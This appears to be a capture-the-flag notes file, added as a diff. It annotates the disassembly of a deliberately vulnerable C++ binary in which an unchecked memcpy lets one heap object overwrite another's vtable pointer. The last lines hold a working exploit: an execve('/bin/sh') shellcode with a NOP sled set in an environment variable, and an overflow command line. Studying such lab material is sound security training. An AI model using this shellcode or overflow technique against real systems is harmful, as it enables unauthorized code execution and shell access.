@@ -1,0 +1,138 @@
+N {
+	void *vtable;
+	char annotation[0x64];
+	int nb; n + 0x68
+}
+
+N::operator+(N n1):
+0x0804873a <+0>:	push   ebp
+0x0804873b <+1>:	mov    ebp,esp
+
+0x0804873d <+3>:	mov    eax,DWORD PTR [ebp+0x8] ; eax = n2
+0x08048740 <+6>:	mov    edx,DWORD PTR [eax+0x68] ; edx = n2.nb
+0x08048743 <+9>:	mov    eax,DWORD PTR [ebp+0xc] ; eax = n1;
+0x08048746 <+12>:	mov    eax,DWORD PTR [eax+0x68] ; eax = n1.nb
+0x08048749 <+15>:	add    eax,edx ; eax = n2.nb + n1.nb
+0x0804874b <+17>:	pop    ebp
+0x0804874c <+18>:	ret
+
+N::operator-(N&):
+   0x804874e <_ZN1NmiERS_>:	push   ebp
+   0x804874f <_ZN1NmiERS_+1>:	mov    ebp,esp
+   0x8048751 <_ZN1NmiERS_+3>:	mov    eax,DWORD PTR [ebp+0x8]
+   0x8048754 <_ZN1NmiERS_+6>:	mov    edx,DWORD PTR [eax+0x68]
+   0x8048757 <_ZN1NmiERS_+9>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x804875a <_ZN1NmiERS_+12>:	mov    eax,DWORD PTR [eax+0x68]
+   0x804875d <_ZN1NmiERS_+15>:	mov    ecx,edx
+   0x804875f <_ZN1NmiERS_+17>:	sub    ecx,eax
+
+N::N(int nb):
+0x080486f6 <+0>:	push   %ebp
+0x080486f7 <+1>:	mov    %esp,%ebp
+0x080486f9 <+3>:	mov    0x8(%ebp),%eax ; eax = n
+0x080486fc <+6>:	movl   $0x8048848,(%eax) ; (*n) = 0x8048848
+0x08048702 <+12>:	mov    0x8(%ebp),%eax ; eax = n
+0x08048705 <+15>:	mov    0xc(%ebp),%edx ; edx = nb
+0x08048708 <+18>:	mov    %edx,0x68(%eax) ; n + 0x68 : nb
+0x0804870b <+21>:	pop    %ebp
+0x0804870c <+22>:	ret
+
+N::setAnnotation(char* str):
+0x0804870e <+0>:	push   %ebp
+0x0804870f <+1>:	mov    %esp,%ebp
+0x08048711 <+3>:	sub    $0x18,%esp ; 24
+0x08048714 <+6>:	mov    0xc(%ebp),%eax ; str
+0x08048717 <+9>:	mov    %eax,(%esp)
+0x0804871a <+12>:	call   0x8048520 <strlen@plt> ; strlen(str)
+0x0804871f <+17>:	mov    0x8(%ebp),%edx ; edx = n
+0x08048722 <+20>:	add    $0x4,%edx ; edx = n + 4 = vtable[1]
+0x08048725 <+23>:	mov    %eax,0x8(%esp) ; esp + 8 = strlen(str)
+0x08048729 <+27>:	mov    0xc(%ebp),%eax ; eax = str
+0x0804872c <+30>:	mov    %eax,0x4(%esp) ;
+0x08048730 <+34>:	mov    %edx,(%esp)
+0x08048733 <+37>:	call   0x8048510 <memcpy@plt> memcpy(vtable[1], str, strlen(str))
+0x08048738 <+42>:	leave
+0x08048739 <+43>:	ret
+
+main:
+0x080485f4 <+0>:	push   %ebp
+0x080485f5 <+1>:	mov    %esp,%ebp
+0x080485f7 <+3>:	push   %ebx
+0x080485f8 <+4>:	and    $0xfffffff0,%esp
+
+0x080485fb <+7>:	sub    $0x20,%esp ; 32
+0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
+0x08048602 <+14>:	jg     0x8048610 <main+28>
+if (ac <= 1)
+{
+0x08048604 <+16>:	movl   $0x1,(%esp)
+0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
+}
+0x08048610 <+28>:	movl   $0x6c,(%esp)
+0x08048617 <+35>:	call   0x8048530 <_Znwj@plt> _Znwj(108) = new(108)
+0x0804861c <+40>:	mov    %eax,%ebx ; ebx = eax
+0x0804861e <+42>:	movl   $0x5,0x4(%esp)
+0x08048626 <+50>:	mov    %ebx,(%esp)
+0x08048629 <+53>:	call   0x80486f6 ; <N::N(int)> N::N(5);
+0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
+; esp + 1c = new N(5); (n1)
+
+0x08048632 <+62>:	movl   $0x6c,(%esp)
+0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
+0x0804863e <+74>:	mov    %eax,%ebx
+0x08048640 <+76>:	movl   $0x6,0x4(%esp)
+0x08048648 <+84>:	mov    %ebx,(%esp)
+0x0804864b <+87>:	call   0x80486f6 <N::N>
+0x08048650 <+92>:	mov    %ebx,0x18(%esp)
+; esp + 0x18 = new N(6); (n2)
+
+0x08048654 <+96> :	mov    0x1c(%esp),%eax ; eax = n1;
+0x08048658 <+100>:	mov    %eax,0x14(%esp) ; esp + 0x14 = n1
+0x0804865c <+104>:	mov    0x18(%esp),%eax ; eax = n2;
+0x08048660 <+108>:	mov    %eax,0x10(%esp) ; esp + 0x10 = n2
+
+0x08048664 <+112>:	mov    0xc(%ebp),%eax
+0x08048667 <+115>:	add    $0x4,%eax
+0x0804866a <+118>:	mov    (%eax),%eax ; eax = argv[1]
+0x0804866c <+120>:	mov    %eax,0x4(%esp) ; esp + 4 = argv[1]
+0x08048670 <+124>:	mov    0x14(%esp),%eax
+0x08048674 <+128>:	mov    %eax,(%esp) ; esp = n1
+0x08048677 <+131>:	call   0x804870e <N::setAnnotation(char*)> ; n1->setAnnotation(argv[1])
+
+0x0804867c <+136>:	mov    0x10(%esp),%eax ; n2
+0x08048680 <+140>:	mov    (%eax),%eax ; eax = *n2
+0x08048682 <+142>:	mov    (%eax),%edx ; edx = **n2 = n2->vtable[0]
+0x08048684 <+144>:	mov    0x14(%esp),%eax ; n1
+0x08048688 <+148>:	mov    %eax,0x4(%esp) ; esp + 4 = n1
+0x0804868c <+152>:	mov    0x10(%esp),%eax ; eax = n2
+0x08048690 <+156>:	mov    %eax,(%esp) ;
+0x08048693 <+159>:	call   *%edx ; n2.+(n1) n2 + n1
+0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
+0x08048698 <+164>:	leave
+0x08048699 <+165>:	ret
+
+
+esp + 0x10: n2
+esp + 0x14: n1
+esp + 0x18: n2
+esp + 0x1c: n1
+
+; n1 : 0x0804A008
+; annotation : 0x0804a00c
+; n : 0x0804A070
+
+; n2 : 0x0804A078
+; annotation : 0x0804A07c
+; n : 0x0804a0e0
+
+adresse de l'adresse : 0xbfffff34
+
+
+entre n1->annotation et n2 -> vtable : 108
+
+; memcpy destination : 0x0804a00c
+; shellcode : 0xbffff047
+
+export BINSH=`python -c "print '\x90' * 10000 + '\x31''\xc0''\x50''\x68''\x2f''\x2f''\x73''\x68''\x68''\x2f''\x62''\x69''\x6e''\x89''\xe3''\x89''\xc1''\x89''\xc2''\xb0''\x0b''\xcd''\x80''\x31''\xc0''\x40''\xcd''\x80' + '\x47''\xf0''\xff''\xbf'"`
+
+gdb --args /home/user/level9/level9 `python -c "print 'a' * 108 + '\d5''\xff''\xff''\xbf'"`
